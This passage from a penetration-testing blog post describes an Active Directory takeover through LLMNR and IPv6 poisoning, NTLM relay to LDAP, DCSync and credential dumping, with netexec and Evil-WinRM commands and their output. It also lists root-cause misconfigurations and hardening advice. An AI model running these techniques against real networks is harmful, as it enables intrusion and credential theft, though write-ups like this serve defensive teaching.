runs over standard ports often allowed through firewalls (5985/5986), provides a fully interactive PowerShell session, and includes convenient features for file transfers and script execution. Once connected, I confirmed our elevated privileges:\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003e*Evil-WinRM* PS C:\\Users\\ATTACKER-PC02$\\Documents\u003e net group \"Enterprise Admins\" /domain\nGroup name     Enterprise Admins\nComment        Designated administrators of the enterprise\n\nMembers\n\n-------------------------------------------------------------------------------\nAdministrator            ATTACKER-PC02$          domainadmin\nsql_admin                svcaccount              \nThe command completed successfully.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis completed the attack chain - from having no credentials, I was able to obtain complete control over the Active Directory forest by exploiting a series of misconfigurations.\u003c/p\u003e\n\u003ch2\u003eMachine Account Quota: The Critical Misconfiguration\u003c/h2\u003e\n\u003cp\u003eThe crucial enabler for this attack chain was the default Machine Account Quota (MAQ) setting. This often-overlooked Active Directory configuration determines how many computer accounts a regular user can add to the domain.\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003enetexec ldap 192.168.0.206 -u 'ATTACKER-PC02$' -p 's0m3p455w0rd' -d corp.local -M maq\nLDAP        192.168.0.206      389    DC-SERVER01      [*] Windows Server 2022 Build 20348 (name:DC-SERVER01) (domain:CORP.local)\nLDAP        192.168.0.206      389    DC-SERVER01      [+] corp.local\\ATTACKER-PC02$:s0m3p455w0rd\nMAQ         192.168.0.206      389    DC-SERVER01      [*] Getting the MachineAccountQuota\nMAQ         192.168.0.206      389    DC-SERVER01      MachineAccountQuota: 10\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eIn this environment, the MAQ was set to the default value of 10, allowing any authenticated user to create up to 10 computer accounts. This default setting provided the foothold needed for our attack - without it, the NTLM relay wouldn't have been able to create the machine accounts that subsequently received DCSync privileges.\u003c/p\u003e\n\u003cp\u003eMany organizations don't realize that this default setting effectively hands attackers the ability to establish persistence within the domain with minimal privileges. While Microsoft sets this default to simplify administration, most security standards recommend reducing it to 0, requiring explicit administrative approval for all computer account creations.\u003c/p\u003e\n\u003cp\u003eThe ability to add computer accounts in our relay attack opened the door for the next critical phase: escalating to DCSync privileges through ACL manipulation.\u003c/p\u003e\n\u003ch2\u003eFrom Zero Access to Enterprise Admin: The Full Attack Path\u003c/h2\u003e\n\u003cp\u003eThe attack path from zero credentials to full domain takeover follows a clear progression:\u003c/p\u003e\n\u003cp\u003eStarting with no credentials on the internal network, I identified systems with SMB signing disabled and began network poisoning. Using Responder and MITM6, I intercepted authentication traffic and captured NTLMv2 hashes.\u003c/p\u003e\n\u003cp\u003eRather than wasting time trying to crack these hashes, I set up an NTLM relay attack with Impacket's ntlmrelayx. When a machine authenticated to me, I relayed that authentication to the domain controller's LDAP service.\u003c/p\u003e\n\u003cp\u003eThis relay allowed me to create machine accounts with special delegation rights. More importantly, I managed to modify domain ACLs to grant my machine account DCSync privileges and add it to the Enterprise Admins group.\u003c/p\u003e\n\u003cp\u003eWith DCSync privileges, I extracted all domain credential hashes using secretsdump. This gave me the keys to the kingdom - including the krbtgt hash for Golden Tickets and the Administrator hash for direct domain access.\u003c/p\u003e\n\u003cp\u003eI confirmed my access by establishing a PowerShell session to the domain controller via Evil-WinRM and verifying my Enterprise Admin group membership.\u003c/p\u003e\n\u003cp\u003eAll of this was possible without exploiting a single unpatched vulnerability - just abusing common misconfigurations that exist in many AD environments by default.\u003c/p\u003e\n\u003ch2\u003eRoot Causes \u0026#x26; Attack Chain Summary\u003c/h2\u003e\n\u003cp\u003eThis attack chain exploited several key misconfigurations:\u003c/p\u003e\n\u003cp\u003eSMB Signing Not Required - Almost all machines in the domain had SMB signing disabled. This allowed for NTLM relay attacks against services like LDAP.\u003c/p\u003e\n\u003cp\u003eLLMNR/NBT-NS Enabled - Windows name resolution fallback protocols were enabled, allowing for poisoning attacks to capture authentication attempts.\u003c/p\u003e\n\u003cp\u003eIPv6 DNS Misconfiguration - IPv6 was enabled but not properly secured, letting MITM6 spoof DNS responses over IPv6.\u003c/p\u003e\n\u003cp\u003eWeak ACLs on Domain Objects - The relayed authentication had sufficient privileges to modify domain ACLs, allowing for escalation to DCSync privileges and Enterprise Admin group membership.\u003c/p\u003e\n\u003cp\u003eHigh Machine Account Quota - Default setting of 10 computer accounts per user provided additional attack vectors for domain compromise.\u003c/p\u003e\n\u003ch2\u003eConclusion\u003c/h2\u003e\n\u003cp\u003eThis attack chain demonstrates how a series of common misconfigurations can lead to complete domain compromise, even without exploiting any software vulnerabilities. Starting from zero credentials, I was able to:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eIdentify machines with SMB signing disabled\u003c/li\u003e\n\u003cli\u003eCapture authentication attempts using LLMNR/NBT-NS poisoning and IPv6 DNS spoofing\u003c/li\u003e\n\u003cli\u003eRelay those authentication attempts to create privileged computer accounts\u003c/li\u003e\n\u003cli\u003eEscalate to DCSync privileges and Enterprise Admin membership\u003c/li\u003e\n\u003cli\u003eExtract password hashes for all domain users\u003c/li\u003e\n\u003cli\u003eConfirm complete control over the domain\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eWhat's particularly concerning is that many of these misconfigurations exist by default in Windows environments. Organizations need to proactively harden their Active Directory configurations to protect against these attack vectors.\u003c/p\u003e\n\u003cp\u003eRemember: security is not about patching the latest vulnerabilities but about properly configuring and securing the foundations of your infrastructure. As this case demonstrates, even a fully patched environment can be completely compromised due to misconfiguration.\u003c/p\u003e\n\u003chr\u003e\n\u003cp\u003e\u003cem\u003eDisclaimer: This article is provided for educational purposes only. The techniques described should only be used in authorized environments and security research contexts. Always follow responsible disclosure practices and operate within legal and ethical boundaries.\u003c/em\u003e\u003c/p\u003e\n","excerpt":"Active Directory remains the backbone of most corporate network environments. Despite being a mature technology with decades of security research behind it, ...","title":"From Zero Creds to Enterprise Admin","date":"2025-05-20","tags":["Active Directory","Penetration Testing","NTLM Relay","SMB","DCSync","Domain Takeover","Network Security"]}},"__N_SSG":true},"page":"/blog/[slug]","query":{"slug":"from-zero-creds-to-ea"},"buildId":"EJgAsPo3Kz3qeohT_5Phd","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>